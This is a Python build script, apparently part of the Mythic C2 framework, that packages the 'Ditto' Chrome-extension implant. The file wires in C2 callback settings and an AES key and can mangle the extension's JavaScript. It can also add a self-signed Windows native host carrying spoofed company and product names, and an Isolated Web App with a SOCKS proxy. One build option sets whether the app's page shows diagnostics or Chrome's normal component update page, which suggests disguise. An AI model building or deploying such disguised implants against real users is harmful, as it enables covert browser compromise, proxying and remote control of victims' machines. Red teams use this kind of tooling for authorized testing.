            group_name="Extension",
            ui_position=30,
        ),
        _build_parameter(
            name="manifest_key",
            parameter_type=BuildParameterType.String,
            description="Optional manifest key to pin a deterministic extension identity.",
            default_value="",
            required=False,
            group_name="Extension",
            ui_position=40,
        ),
        _build_parameter(
            name="version",
            parameter_type=BuildParameterType.String,
            description="Optional manifest version. Leave blank to auto-stamp a build version.",
            default_value="",
            required=False,
            group_name="Extension",
            ui_position=50,
        ),
        _build_parameter(
            name="callback_interval",
            parameter_type=BuildParameterType.Number,
            description="Extension polling interval in seconds. HTTP C2 callback_interval overrides this when present.",
            default_value=10,
            required=True,
            group_name="Extension",
            ui_position=60,
        ),
        _build_parameter(
            name="obfuscate_extension",
            parameter_type=BuildParameterType.Boolean,
            description="Minify and mangle Ditto-owned JavaScript identifiers before packaging.",
            default_value=False,
            required=False,
            group_name="Extension",
            ui_position=70,
        ),
        _build_parameter(
            name="build_native_host",
            parameter_type=BuildParameterType.Boolean,
            description="Also build and package the Rust native messaging host.",
            default_value=False,
            required=False,
            group_name="Native Messaging Host",
            ui_position=100,
        ),
        _build_parameter(
            name="native_host_name",
            parameter_type=BuildParameterType.String,
            description="Chrome native messaging host name written to the generated JSON manifest.",
            default_value=DEFAULT_NATIVE_HOST_NAME,
            required=False,
            group_name="Native Messaging Host",
            ui_position=110,
            hide_conditions=[
                HideCondition(name="build_native_host", operand=HideConditionOperand.NotEQ, value=True)
            ],
        ),
        _build_parameter(
            name="native_host_exe_name",
            parameter_type=BuildParameterType.String,
            description="Native host executable filename in the package.",
            default_value=DEFAULT_NATIVE_HOST_EXE_NAME,
            required=False,
            group_name="Native Messaging Host",
            ui_position=120,
            hide_conditions=[
                HideCondition(name="build_native_host", operand=HideConditionOperand.NotEQ, value=True)
            ],
        ),
        _build_parameter(
            name="native_host_company",
            parameter_type=BuildParameterType.String,
            description="Version resource CompanyName for the native host.",
            default_value=DEFAULT_NATIVE_HOST_COMPANY,
            required=False,
            group_name="Native Messaging Host",
            ui_position=130,
            hide_conditions=[
                HideCondition(name="build_native_host", operand=HideConditionOperand.NotEQ, value=True)
            ],
        ),
        _build_parameter(
            name="native_host_description",
            parameter_type=BuildParameterType.String,
            description="Version resource FileDescription for the native host.",
            default_value=DEFAULT_NATIVE_HOST_DESCRIPTION,
            required=False,
            group_name="Native Messaging Host",
            ui_position=140,
            hide_conditions=[
                HideCondition(name="build_native_host", operand=HideConditionOperand.NotEQ, value=True)
            ],
        ),
        _build_parameter(
            name="native_host_allowed_extension_id",
            parameter_type=BuildParameterType.String,
            description="Optional extension ID for native host allowed_origins. Defaults to manifest_key-derived ID when available.",
            default_value="",
            required=False,
            group_name="Native Messaging Host",
            ui_position=150,
            hide_conditions=[
                HideCondition(name="build_native_host", operand=HideConditionOperand.NotEQ, value=True)
            ],
        ),
        _build_parameter(
            name="native_host_sign",
            parameter_type=BuildParameterType.Boolean,
            description="Self-sign the native host executable in the Mythic build container.",
            default_value=True,
            required=False,
            group_name="Native Messaging Host",
            ui_position=160,
            hide_conditions=[
                HideCondition(name="build_native_host", operand=HideConditionOperand.NotEQ, value=True)
            ],
        ),
        _build_parameter(
            name="native_host_signer_subject",
            parameter_type=BuildParameterType.String,
            description="Self-signed certificate common name for the native host.",
            default_value=DEFAULT_NATIVE_HOST_SIGNER,
            required=False,
            group_name="Native Messaging Host",
            ui_position=170,
            hide_conditions=[
                HideCondition(name="build_native_host", operand=HideConditionOperand.NotEQ, value=True),
                HideCondition(name="native_host_sign", operand=HideConditionOperand.NotEQ, value=True),
            ],
        ),
        _build_parameter(
            name="native_host_product",
            parameter_type=BuildParameterType.String,
            description="Version resource ProductName and signing product label for the native host.",
            default_value=DEFAULT_NATIVE_HOST_PRODUCT,
            required=False,
            group_name="Native Messaging Host",
            ui_position=180,
            hide_conditions=[
                HideCondition(name="build_native_host", operand=HideConditionOperand.NotEQ, value=True),
                HideCondition(name="native_host_sign", operand=HideConditionOperand.NotEQ, value=True),
            ],
        ),
        _build_parameter(
            name="build_iwa",
            parameter_type=BuildParameterType.Boolean,
            description="Also build the Ditto Isolated Web App bundle and install artifacts.",
            default_value=False,
            required=False,
            group_name="IWA",
            ui_position=200,
        ),
        _build_parameter(
            name="iwa_private_key_b64",
            parameter_type=BuildParameterType.String,
            description="Optional base64-encoded PEM private-ecdsa-p256.key bytes for stable IWA signing.",
            default_value="",
            required=False,
            group_name="IWA",
            ui_position=210,
            hide_conditions=[
                HideCondition(name="build_iwa", operand=HideConditionOperand.NotEQ, value=True)
            ],
        ),
        _build_parameter(
            name="iwa_bridge_extension_id",
            parameter_type=BuildParameterType.String,
            description="Optional extension ID the IWA should handshake with. Defaults to the manifest_key-derived ID when available.",
            default_value="",
            required=False,
            group_name="IWA",
            ui_position=220,
            hide_conditions=[
                HideCondition(name="build_iwa", operand=HideConditionOperand.NotEQ, value=True)
            ],
        ),
        _build_parameter(
            name="iwa_control_port",
            parameter_type=BuildParameterType.Number,
            description="IWA control WebSocket listen port.",
            default_value=DEFAULT_IWA_CONTROL_PORT,
            required=False,
            group_name="IWA",
            ui_position=230,
            hide_conditions=[
                HideCondition(name="build_iwa", operand=HideConditionOperand.NotEQ, value=True)
            ],
        ),
        _build_parameter(
            name="iwa_debugger",
            parameter_type=BuildParameterType.Boolean,
            description="Show advanced IWA build/debug options.",
            default_value=False,
            required=False,
            group_name="IWA",
            ui_position=240,
            hide_conditions=[
                HideCondition(name="build_iwa", operand=HideConditionOperand.NotEQ, value=True)
            ],
        ),
        _build_parameter(
            name="iwa_debug_ui",
            parameter_type=BuildParameterType.Boolean,
            description="Show the IWA diagnostic page instead of the normal Chrome component update page.",
            default_value=False,
            required=False,
            group_name="IWA",
            ui_position=250,
            hide_conditions=[
                HideCondition(name="build_iwa", operand=HideConditionOperand.NotEQ, value=True),
                HideCondition(name="iwa_debugger", operand=HideConditionOperand.NotEQ, value=True),
            ],
        ),
        _build_parameter(
            name="iwa_control_host",
            parameter_type=BuildParameterType.String,
            description="IWA control WebSocket listen host.",
            default_value=DEFAULT_IWA_CONTROL_HOST,
            required=False,
            group_name="IWA",
            ui_position=260,
            hide_conditions=[
                HideCondition(name="build_iwa", operand=HideConditionOperand.NotEQ, value=True),
                HideCondition(name="iwa_debugger", operand=HideConditionOperand.NotEQ, value=True),
            ],
        ),
        _build_parameter(
            name="iwa_debug_local_socks",
            parameter_type=BuildParameterType.Boolean,
            description="Debug build option: expose the IWA's local SOCKS5 listener. Mythic SOCKS does not require this.",
            default_value=False,
            required=False,
            group_name="IWA",
            ui_position=270,
            hide_conditions=[
                HideCondition(name="build_iwa", operand=HideConditionOperand.NotEQ, value=True),
                HideCondition(name="iwa_debugger", operand=HideConditionOperand.NotEQ, value=True),
            ],
        ),
        _build_parameter(
            name="iwa_auto_start_socks",
            parameter_type=BuildParameterType.Boolean,
            description="Debug option: start the local IWA SOCKS listener when the IWA launches.",
            default_value=False,
            required=False,
            group_name="IWA",
            ui_position=280,
            hide_conditions=[
                HideCondition(name="build_iwa", operand=HideConditionOperand.NotEQ, value=True),
                HideCondition(name="iwa_debugger", operand=HideConditionOperand.NotEQ, value=True),
            ],
        ),
        _build_parameter(
            name="iwa_socks_host",
            parameter_type=BuildParameterType.String,
            description="Debug local SOCKS listen host, used only when iwa_debug_local_socks=true.",
            default_value=DEFAULT_IWA_SOCKS_HOST,
            required=False,
            group_name="IWA",
            ui_position=290,
            hide_conditions=[
                HideCondition(name="build_iwa", operand=HideConditionOperand.NotEQ, value=True),
                HideCondition(name="iwa_debugger", operand=HideConditionOperand.NotEQ, value=True),
            ],
        ),
        _build_parameter(
            name="iwa_socks_port",
            parameter_type=BuildParameterType.Number,
            description="Debug local SOCKS listen port, used only when iwa_debug_local_socks=true.",
            default_value=DEFAULT_IWA_SOCKS_PORT,
            required=False,
            group_name="IWA",
            ui_position=300,
            hide_conditions=[
                HideCondition(name="build_iwa", operand=HideConditionOperand.NotEQ, value=True),
                HideCondition(name="iwa_debugger", operand=HideConditionOperand.NotEQ, value=True),
            ],
        ),
    ]

    c2_profiles = ["http"]

    build_steps = [
        BuildStep(step_name=STEP_GATHERING, step_description="Collecting extension files"),
        BuildStep(step_name=STEP_CONFIGURING, step_description="Applying Mythic configuration"),
        BuildStep(step_name=STEP_IWA, step_description="Checking whether IWA build is enabled"),
        BuildStep(step_name=STEP_IWA_PREPARE, step_description="Preparing IWA workspace and config"),
        BuildStep(step_name=STEP_IWA_DEPS, step_description="Installing or reusing IWA npm dependencies"),
        BuildStep(step_name=STEP_IWA_BUNDLE, step_description="Running signed web bundle build"),
        BuildStep(step_name=STEP_IWA_METADATA, step_description="Creating IWA install metadata and protobufs"),
        BuildStep(step_name=STEP_OBFUSCATING, step_description="Optionally minifying and mangling agent scripts"),
        BuildStep(step_name=STEP_NATIVE_HOST, step_description="Checking whether native host build is enabled"),
        BuildStep(step_name=STEP_NATIVE_HOST_PREPARE, step_description="Preparing Rust native host workspace"),
        BuildStep(step_name=STEP_NATIVE_HOST_COMPILE, step_description="Running cargo-xwin release build"),
        BuildStep(step_name=STEP_NATIVE_HOST_HARDEN, step_description="Cleaning native host PE before packaging"),
        BuildStep(step_name=STEP_NATIVE_HOST_SIGN, step_description="Optionally signing native host PE"),
        BuildStep(step_name=STEP_PACKAGING, step_description="Building extension archive"),
    ]

    async def _update_build_step(self, step_name: str, stdout: str, success: bool = True) -> None:
        try:
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName=step_name,
                StepStdout=stdout,
                StepSuccess=success,
            ))
        except Exception:
            pass

    async def build(self) -> BuildResponse:
        await self._update_build_step(STEP_GATHERING, "Resolving build inputs and uploaded files.")
        extension_icon = str(_get_parameter(self, "extension_icon", "")).strip()
        extension_icon_bytes = (
            await _fetch_uploaded_file(extension_icon)
            if extension_icon
            else b""
        )
        await self._update_build_step(STEP_GATHERING, "Collected build inputs.")

        loop = asyncio.get_running_loop()

        def update_step(step_name: str, stdout: str, success: bool = True) -> None:
            future = asyncio.run_coroutine_threadsafe(
                self._update_build_step(step_name, stdout, success),
                loop,
            )
            try:
                future.result(timeout=30)
            except Exception:
                pass

        return await asyncio.to_thread(self._build_sync, extension_icon_bytes, update_step)

    def _build_sync(self, extension_icon_bytes: bytes, update_step=None) -> BuildResponse:
        response = BuildResponse(status=BuildStatus.Error)
        active_step = STEP_CONFIGURING

        def step(step_name: str, stdout: str, success: bool = True) -> None:
            nonlocal active_step
            active_step = step_name
            if update_step:
                update_step(step_name, stdout, success)

        try:
            step(STEP_CONFIGURING, "Reading build parameters and selected commands.")
            callback_host = "http://127.0.0.1:8080"
            callback_port = "8080"
            callback_interval = str(_get_parameter_any(
                self,
                ["callback_interval", "extension_callback_interval"],
                10,
            ))
            callback_jitter = "0"
            post_uri = "data"
            aes_key = ""
            extension_name = (
                str(_get_parameter_any(self, ["name", "extension_name"], DEFAULT_EXTENSION_NAME)).strip()
                or DEFAULT_EXTENSION_NAME
            )
            extension_description = (
                str(_get_parameter_any(
                    self,
                    ["description", "extension_description"],
                    DEFAULT_EXTENSION_DESCRIPTION,
                )).strip()
                or DEFAULT_EXTENSION_DESCRIPTION
            )
            manifest_key = str(_get_parameter_any(self, ["manifest_key", "extension_manifest_key"], "")).strip()
            obfuscate = _get_bool_parameter(
                self,
                "obfuscate_extension",
                _get_bool_parameter(
                    self,
                    "extension_obfuscate",
                    _get_bool_parameter(self, "obfuscate", False),
                ),
            )
            extension_icon = str(_get_parameter(self, "extension_icon", "")).strip()
            build_iwa = _get_bool_parameter(self, "build_iwa", _get_bool_parameter(self, "iwa_build", False))
            build_native_host = _get_bool_parameter(
                self,
                "build_native_host",
                _get_bool_parameter(self, "native_host_build", False),
            )
            native_host_name = _validate_native_host_name(
                str(_get_parameter(self, "native_host_name", DEFAULT_NATIVE_HOST_NAME)).strip()
            )
            native_host_allowed_extension_id = str(
                _get_parameter(self, "native_host_allowed_extension_id", "")
            ).strip().lower()
            native_host_exe_name = _sanitize_filename(
                str(_get_parameter(self, "native_host_exe_name", DEFAULT_NATIVE_HOST_EXE_NAME)).strip()
                or DEFAULT_NATIVE_HOST_EXE_NAME,
                DEFAULT_NATIVE_HOST_EXE_NAME,
            )
            if not native_host_exe_name.lower().endswith(".exe"):
                native_host_exe_name += ".exe"
            native_host_company = _sanitize_native_identity(
                str(_get_parameter(self, "native_host_company", DEFAULT_NATIVE_HOST_COMPANY)).strip(),
                DEFAULT_NATIVE_HOST_COMPANY,
            )
            native_host_product = _sanitize_native_identity(
                str(_get_parameter(self, "native_host_product", DEFAULT_NATIVE_HOST_PRODUCT)).strip(),
                DEFAULT_NATIVE_HOST_PRODUCT,
            )
            native_host_description = _sanitize_native_identity(
                str(_get_parameter(self, "native_host_description", DEFAULT_NATIVE_HOST_DESCRIPTION)).strip(),
                DEFAULT_NATIVE_HOST_DESCRIPTION,
            )
            native_host_signer_subject = _sanitize_native_identity(
                str(_get_parameter(self, "native_host_signer_subject", DEFAULT_NATIVE_HOST_SIGNER)).strip(),
                DEFAULT_NATIVE_HOST_SIGNER,
            )
            native_host_sign = _get_bool_parameter(self, "native_host_sign", True)
            native_host_key = (
                base64.b64encode(secrets.token_bytes(32)).decode("ascii")
                if build_native_host
                else ""
            )
            iwa_control_host = (
                str(_get_parameter(self, "iwa_control_host", DEFAULT_IWA_CONTROL_HOST)).strip()
                or DEFAULT_IWA_CONTROL_HOST
            )
            iwa_control_port = _get_int_parameter(self, "iwa_control_port", DEFAULT_IWA_CONTROL_PORT)
            iwa_debug_ui = _get_bool_parameter(self, "iwa_debug_ui", False)
            iwa_private_key_b64 = str(_get_parameter(self, "iwa_private_key_b64", "")).strip()
            iwa_debug_local_socks = _get_bool_parameter(self, "iwa_debug_local_socks", False)
            iwa_socks_host = (
                str(_get_parameter(self, "iwa_socks_host", DEFAULT_IWA_SOCKS_HOST)).strip()
                or DEFAULT_IWA_SOCKS_HOST
            )
            iwa_socks_port = _get_int_parameter(self, "iwa_socks_port", DEFAULT_IWA_SOCKS_PORT)
            iwa_auto_start_socks = _get_bool_parameter(self, "iwa_auto_start_socks", False)
            effective_iwa_socks_host = iwa_socks_host if iwa_debug_local_socks else ""
            effective_iwa_socks_port = iwa_socks_port if iwa_debug_local_socks else 0
            iwa_bridge_extension_id = str(_get_parameter(self, "iwa_bridge_extension_id", "")).strip()
            if not iwa_bridge_extension_id:
                iwa_bridge_extension_id = _extension_id_from_manifest_key(manifest_key)
            if not native_host_allowed_extension_id:
                native_host_allowed_extension_id = _extension_id_from_manifest_key(manifest_key)
            if native_host_allowed_extension_id and not re.fullmatch(r"[a-p]{32}", native_host_allowed_extension_id):
                raise ValueError("native_host_allowed_extension_id must be a 32-character Chrome extension ID")
            included_commands = _get_included_commands(self)
            native_host_commands = _selected_native_host_commands(included_commands)
            native_host_required_commands = _selected_native_host_required_commands(included_commands)
            iwa_commands = _selected_iwa_commands(included_commands)
            if native_host_required_commands and not build_native_host:
                raise ValueError(
                    "Native host command(s) were selected, but build_native_host is false. "
                    "Enable build_native_host or deselect: "
                    f"{', '.join(native_host_required_commands)}"
                )
            if build_native_host and not native_host_commands:
                raise ValueError(
                    "build_native_host=true requires selecting at least one native host command: "
                    f"{', '.join(NATIVE_HOST_COMMANDS)}"
                )
            if iwa_commands and not build_iwa:
                raise ValueError(
                    "IWA command(s) were selected, but build_iwa is false. "
                    "Enable build_iwa or deselect: "
                    f"{', '.join(iwa_commands)}"
                )
            step(
                STEP_CONFIGURING,
                "Validated build parameters and command selections "
                f"(native_host={str(build_native_host).lower()}, iwa={str(build_iwa).lower()}).",
            )

            for c2 in self.c2info:
                if c2.get_c2profile()["name"] != "http":
                    continue

                c2_params = c2.get_parameters_dict()
                callback_host = c2_params.get("callback_host", callback_host)
                callback_port = str(c2_params.get("callback_port", callback_port))
                callback_interval = str(c2_params.get("callback_interval", callback_interval))
                callback_jitter = str(c2_params.get("callback_jitter", callback_jitter))
                post_uri = c2_params.get("post_uri", post_uri)

                aes_psk = c2_params.get("AESPSK", None)
                if isinstance(aes_psk, dict):
                    aes_key = aes_psk.get("enc_key", "") or aes_psk.get("dec_key", "") or ""
                elif isinstance(aes_psk, str):
                    aes_key = aes_psk
                else:
                    aes_key = getattr(aes_psk, "enc_key", None) or getattr(aes_psk, "dec_key", None) or ""
                break

            if aes_key in ["", "none", "None", "aes256_hmac"]:
                aes_key = ""

            build_version = str(_get_parameter_any(self, ["version", "extension_version"], "")).strip()
            if not build_version:
                build_version = f"0.1.{int(datetime.utcnow().timestamp()) % 60000}"

            alarm_name = f"a{secrets.token_hex(8)}"
            config_values = {
                "h": callback_host,
                "p": callback_port,
                "i": callback_interval,
                "j": callback_jitter,
                "o": post_uri,
                "x": self.uuid,
                "k": aes_key,
                "m": alarm_name,
            }
            config_bootstrap = (
                _build_embedded_config_bootstrap(config_values)
                if obfuscate
                else 'importScripts("config.js");'
            )

            with tempfile.TemporaryDirectory() as tmpdir:
                step(STEP_GATHERING, "Copying extension source into a temporary build workspace.")
                output_dir = Path(tmpdir) / "ditto"
                shutil.copytree(self.agent_code_path, output_dir)
                step(STEP_GATHERING, "Extension source copied into build workspace.")
                icon_relative_path = ""
                iwa_artifacts = None
                iwa_url = DEFAULT_IWA_ORIGIN

                if build_iwa:
                    step(
                        STEP_IWA,
                        f"Building signed IWA bundle and install artifacts for {iwa_control_host}:{iwa_control_port}.",
                    )
                    iwa_artifacts = _build_iwa_artifacts(
                        self.iwa_code_path,
                        Path(tmpdir),
                        control_host=iwa_control_host,
                        control_port=iwa_control_port,
                        local_socks_enabled=iwa_debug_local_socks,
                        socks_host=effective_iwa_socks_host,
                        socks_port=effective_iwa_socks_port,
                        auto_start_socks=iwa_auto_start_socks,
                        bridge_extension_id=iwa_bridge_extension_id,
                        debug_ui=iwa_debug_ui,
                        private_key_b64=iwa_private_key_b64,
                        progress=step,
                    )
                    iwa_url = iwa_artifacts["install_info"]["iwa_origin"]
                    step(
                        STEP_IWA,
                        "Built IWA artifacts "
                        f"app_id={iwa_artifacts['install_info']['app_id']} "
                        f"bundle_id={iwa_artifacts['install_info']['web_bundle_id']}.",
                    )
                else:
                    step(STEP_IWA, "IWA build disabled for this payload.")

                replacements = {
                    "%%CONFIG_BOOTSTRAP%%": config_bootstrap,
                    "%%CALLBACK_HOST%%": callback_host,
                    "%%CALLBACK_PORT%%": callback_port,
                    "%%CALLBACK_INTERVAL%%": callback_interval,
                    "%%CALLBACK_JITTER%%": callback_jitter,
                    "%%AES_KEY%%": aes_key,
                    "%%POST_URI%%": post_uri,
                    "%%PAYLOAD_UUID%%": self.uuid,
                    "%%ALARM_NAME%%": alarm_name,
                    "%%IWA_URL%%": iwa_url,
                    "%%IWA_CONTROL_URL%%": f"ws://{iwa_control_host}:{iwa_control_port}",
                    "%%IWA_SOCKS_PORT%%": str(effective_iwa_socks_port),
                    "%%NATIVE_HOST_NAME%%": native_host_name if build_native_host else "",
                    "%%NATIVE_HOST_KEY%%": native_host_key,
                    "%%NATIVE_HOST_RUNTIME%%": NATIVE_HOST_RUNTIME_JS if build_native_host else "",
                    "%%NATIVE_HOST_CASES%%": NATIVE_HOST_CASES_JS if build_native_host else "",
                }

                if obfuscate:
                    config_path = output_dir / "config.js"
                    if config_path.exists():
                        config_path.unlink()

                if extension_icon:
                    step(STEP_CONFIGURING, "Embedding uploaded extension icon.")
                    icon_relative_path = _write_extension_icon(
                        output_dir,
                        extension_icon_bytes,
                    )

                step(STEP_CONFIGURING, "Applying runtime configuration into extension files.")
                for path in output_dir.rglob("*"):
                    if not path.is_file():
                        continue
                    if path.name == "manifest.json":
                        continue
                    if path.suffix.lower() not in {".js", ".json", ".html", ".css", ".txt"}:
                        continue

                    text = path.read_text(encoding="utf-8")
                    for old, new in replacements.items():
                        text = text.replace(old, str(new))

                    if obfuscate and path.suffix == ".js":
                        text = _obfuscate_javascript(text)

                    path.write_text(text, encoding="utf-8")

                step(
                    STEP_OBFUSCATING,
                    "Extension JavaScript obfuscation completed." if obfuscate else "Extension JavaScript obfuscation disabled.",
                )

                _write_manifest(
                    output_dir / "manifest.json",
                    extension_name=extension_name,
                    extension_version=build_version,
                    extension_description=extension_description,
                    manifest_key=manifest_key,
                    included_commands=included_commands,
                    icon_relative_path=icon_relative_path,
                )

                native_host_message = ""
                if build_native_host:
                    step(
                        STEP_NATIVE_HOST,
                        "Building MSVC Rust native messaging host "
                        f"with commands: {', '.join(native_host_commands)}.",
                    )
                    native_artifacts = _build_native_host_artifacts(
                        self.native_host_code_path,
                        Path(tmpdir),
                        commands=native_host_commands,
                        key_b64=native_host_key,
                        exe_name=native_host_exe_name,
                        sign=native_host_sign,
                        company=native_host_company,
                        product=native_host_product,
                        description=native_host_description,
                        signer_subject=native_host_signer_subject,
                        progress=step,
                    )
                    step(
                        STEP_NATIVE_HOST,
                        "Built native messaging host "
                        f"target={native_artifacts['target']} "
                        f"features={','.join(native_artifacts['features'])}.",
                    )
                    native_relative_dir = "native_host"
                    native_dir = output_dir / native_relative_dir
                    native_dir.mkdir(parents=True, exist_ok=True)
                    native_exe_relative = f"{native_relative_dir}/{native_host_exe_name}"
                    native_manifest_relative = f"{native_host_name}.json"
                    shutil.copy2(native_artifacts["exe_path"], native_dir / native_host_exe_name)
                    _write_native_host_manifest(
                        output_dir / native_manifest_relative,
                        host_name=native_host_name,
                        exe_relative_path=native_exe_relative,
                        extension_id=native_host_allowed_extension_id,
                    )
                    _write_native_host_readme(
                        native_dir / "README.txt",
                        host_name=native_host_name,
                        manifest_relative_path=native_manifest_relative,
                        exe_relative_path=native_exe_relative,
                        extension_id=native_host_allowed_extension_id,
                        commands=native_host_commands,
                    )
                    native_host_message = (
                        f"; native_host={native_host_name} "
                        f"commands={','.join(native_host_commands)} "
                        f"origin={native_host_allowed_extension_id or '<extension-id>'}"
                    )
                else:
                    step(STEP_NATIVE_HOST, "Native messaging host build disabled for this payload.")

                payload_filename = str(getattr(self, "filename", "") or "").strip()
                archive_name = _build_archive_filename(
                    payload_filename,
                    f"{extension_name}-iwa" if build_iwa else (
                        f"{extension_name}-native" if build_native_host else (extension_name or self.uuid)
                    ),
                )
                step(STEP_PACKAGING, "Creating extension archive.")
                extension_zip_path = Path(tmpdir) / ("extension.zip" if build_iwa else archive_name)
                with zipfile.ZipFile(extension_zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
                    for path in output_dir.rglob("*"):
                        if path.is_file():
                            archive.write(path, path.relative_to(output_dir))

                iwa_message = ""
                if build_iwa:
                    step(STEP_PACKAGING, "Creating combined extension and IWA payload archive.")
                    if iwa_artifacts is None:
                        raise ValueError("IWA build artifacts were not created")
                    package_dir = Path(tmpdir) / "payload"
                    shutil.copytree(output_dir, package_dir / "extension")
                    shutil.copy2(extension_zip_path, package_dir / "extension.zip")
                    (package_dir / "iwa" / "install-artifacts").mkdir(parents=True, exist_ok=True)
                    shutil.copy2(iwa_artifacts["bundle_path"], package_dir / "iwa" / "app.swbn")
                    shutil.copy2(
                        iwa_artifacts["record_path"],
                        package_dir / "iwa" / "install-artifacts" / "webapp.pb",
                    )
                    shutil.copy2(
                        iwa_artifacts["key_distribution_path"],
                        package_dir / "iwa" / "install-artifacts" / "iwa-key-distribution.pb",
                    )
                    shutil.copy2(
                        iwa_artifacts["install_info_path"],
                        package_dir / "iwa" / "install-artifacts" / "install-info.json",
                    )
                    shutil.copy2(
                        iwa_artifacts["bundle_info_path"],
                        package_dir / "iwa" / "install-artifacts" / "bundle-info.json",
                    )
                    shutil.copytree(
                        iwa_artifacts["manifest_resources_path"],
                        package_dir / "iwa" / "manifest-resources",
                    )
                    _write_iwa_package_readme(
                        package_dir,
                        iwa_artifacts["install_info"],
                        extension_id=native_host_allowed_extension_id or _extension_id_from_manifest_key(manifest_key),
                        native_host_name=native_host_name if build_native_host else "",
                        native_host_exe_name=native_host_exe_name if build_native_host else "",
                    )

                    archive_path = Path(tmpdir) / archive_name
                    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as archive:
                        for path in package_dir.rglob("*"):
                            if path.is_file():
                                archive.write(path, path.relative_to(package_dir))

                    iwa_message = (
                        f"; IWA app_id={iwa_artifacts['install_info']['app_id']} "
                        f"bundle_id={iwa_artifacts['install_info']['web_bundle_id']} "
                        f"control=ws://{iwa_control_host}:{iwa_control_port} "
                        f"local_socks="
                        f"{iwa_socks_host + ':' + str(iwa_socks_port) if iwa_debug_local_socks else 'disabled'}"
                    )
                else:
                    archive_path = extension_zip_path

                response.payload = archive_path.read_bytes()
                response.status = BuildStatus.Success
                response.build_message = (
                    "Ditto extension package generated "
                    f"({'obfuscated' if obfuscate else 'plain'} JavaScript)"
                    f"{native_host_message}"
                    f"{iwa_message}"
                )
                response.updated_filename = archive_path.name
                step(STEP_PACKAGING, f"Payload archive ready: {archive_path.name}.")

        except Exception as exc:
            step(active_step, str(exc), False)
            response.build_stderr = str(exc)

        return response
